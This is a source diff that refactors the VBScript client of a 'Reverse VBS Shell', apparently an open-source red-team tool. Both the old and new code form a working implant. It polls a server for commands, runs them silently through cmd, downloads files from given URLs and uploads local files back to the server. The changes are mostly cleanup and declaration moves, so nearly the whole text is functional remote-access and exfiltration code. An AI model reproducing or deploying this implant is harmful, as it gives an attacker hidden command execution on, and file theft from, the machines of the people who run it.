@@ -1,4 +1,4 @@
-' this software is provided under under the bsd 3-clause license.
+' This software is provided under under the BSD 3-Clause License.
 ' See the accompanying LICENSE file for more information.
 '
 ' Client for Reverse VBS Shell
@@ -12,28 +12,20 @@
 
 Option Explicit
 On Error Resume Next
-' General
-Dim strResponse, arrResponseText, strRawCommand, strCommand, strArgument, strPostResponse
-' Configuration
-Dim strHost, strPort, strUrl
-' SLEEP
-Dim intSleep, strSleep
-' SHELL
-Dim fs, shell, strOutFile, file, text
-' WGET
-Dim arrSplitUrl, strFilename, http, stream
-' GET
-Dim binFileContents
 
 ' Instantiate objects
-Set shell = CreateObject("WScript.Shell")
-Set fs = CreateObject("Scripting.FileSystemObject")
-Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+Dim shell: Set shell = CreateObject("WScript.Shell")
+Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
+Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
 If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
 If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
 
+' Initialize variables used by GET/WGET
+Dim arrSplitUrl, strFilename, stream
+
 ' Configuration
+Dim strHost, strPort, strUrl, intSleep
 strHost = "127.0.0.1"
 strPort = "8080"
 intSleep = 5000
@@ -44,20 +36,17 @@ While True
     ' Fetch next command
     http.Open "GET", strUrl & "/", False
     http.Send
+    Dim strRawCommand
     strRawCommand = http.ResponseText
 
-    ' Debugging
-    'strRawCommand = "SHELL ipconfig"
-
     ' Determine command and arguments
+    Dim arrResponseText, strCommand, strArgument
     arrResponseText = Split(strRawCommand, " ", 2)
     strCommand = arrResponseText(0)
     strArgument = ""
     If UBound(arrResponseText) > 0 Then
         strArgument = arrResponseText(1)
     End If
-
-    strResponse = ""
 
     ' Execute command
     Select Case strCommand
@@ -71,24 +60,35 @@ While True
                 intSleep = CInt(strArgument)
                 SendStatusUpdate strRawCommand, "Sleep set to " & strArgument & "ms"
             Else
+                Dim strSleep
                 strSleep = CStr(intSleep)
                 SendStatusUpdate strRawCommand, "Sleep is currently set to " & strSleep & "ms"
+                strSleep = Empty
             End If
         
         ' Execute command
         Case "SHELL"
             'Execute and write to file
-            strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
+            Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
             shell.Run "cmd /C " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True
 
             ' Read out file
-            Set file = fs.OpenTextFile(strOutfile, 1)
-            text = file.ReadAll
+            Dim file: Set file = fs.OpenTextFile(strOutfile, 1)
+            Dim text
+            If Not file.AtEndOfStream Then
+                text = file.ReadAll
+            Else
+                text = "[empty result]"
+            End If
             file.Close
             fs.DeleteFile strOutFile, True
 
             ' Set response
             SendStatusUpdate strRawCommand, text
+
+            ' Clean up
+            strOutFile = Empty
+            text = Empty
 
         ' Download a file from a URL
         Case "WGET"
@@ -117,6 +117,10 @@ While True
                 SendStatusUpdate strRawCommand, "File download from " & strArgument & " successful."
             End If
 
+            ' Clean up
+            arrSplitUrl = Array()
+            strFilename = Empty
+
         Case "GET"
             ' Only download if file exists
             If fs.FileExists(strArgument) Then
@@ -129,12 +133,22 @@ While True
                 stream.Type = 1 ' adTypeBinary
                 stream.Open
                 stream.LoadFromFile strArgument
+                Dim binFileContents
                 binFileContents = stream.Read
 
+                ' Upload file
                 DoHttpBinaryPost "upload", strRawCommand, strFilename, binFileContents
+
+                ' Clean up
+                binFileContents = Empty
             Else
                 SendStatusUpdate strRawCommand, "File does not exist: " & strArgument
             End If
+
+            ' Clean up
+            arrSplitUrl = Array()
+            strFilename = Empty
+
         Case "KILL"
             SendStatusUpdate strRawCommand, "Goodbye!"
             WScript.Quit 0
@@ -142,6 +156,12 @@ While True
         Case Else
             SendStatusUpdate strRawCommand, "Unknown command"
     End Select
+
+    ' Clean up
+    strRawCommand = Empty
+    arrResponseText = Array()
+    strCommand = Empty
+    strArgument = Empty
 Wend
 
 
@@ -168,16 +188,16 @@ Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
     binText = StringToBinary(strText)
 
     ' Concatenate POST headers, data elements and footer
-    Dim oStream : Set oStream = CreateObject("Adodb.Stream")
-    oStream.Open
-    oStream.Type = 1 ' adTypeBinary
-    oStream.Write binTextHeader
-    oStream.Write binText
-    oStream.Write binDataHeader
-    oStream.Write binData
-    oStream.Write binFooter
-    oStream.Position = 0
-    binConcatenated = oStream.Read(oStream.Size)
+    Dim stream : Set stream = CreateObject("Adodb.Stream")
+    stream.Open
+    stream.Type = 1 ' adTypeBinary
+    stream.Write binTextHeader
+    stream.Write binText
+    stream.Write binDataHeader
+    stream.Write binData
+    stream.Write binFooter
+    stream.Position = 0
+    binConcatenated = stream.Read(stream.Size)
 
     ' Post data
     http.Open "POST", strUrl & "/" & strActionType, False
@@ -192,19 +212,18 @@ End Function
 
 
 Function StringToBinary(Text)
-    Dim BinaryStream
-    Set BinaryStream = CreateObject("Adodb.Stream")
-    BinaryStream.Type = 2 'adTypeText
-    BinaryStream.CharSet = "us-ascii"
+    Dim stream: Set stream = CreateObject("Adodb.Stream")
+    stream.Type = 2 'adTypeText
+    stream.CharSet = "us-ascii"
 
     ' Store text in stream
-    BinaryStream.Open
-    BinaryStream.WriteText Text
+    stream.Open
+    stream.WriteText Text
 
     ' Change stream type To binary
-    BinaryStream.Position = 0
-    BinaryStream.Type = 1 'adTypeBinary
+    stream.Position = 0
+    stream.Type = 1 'adTypeBinary
   
     ' Return binary data
-    StringToBinary = BinaryStream.Read
+    StringToBinary = stream.Read
 End Function
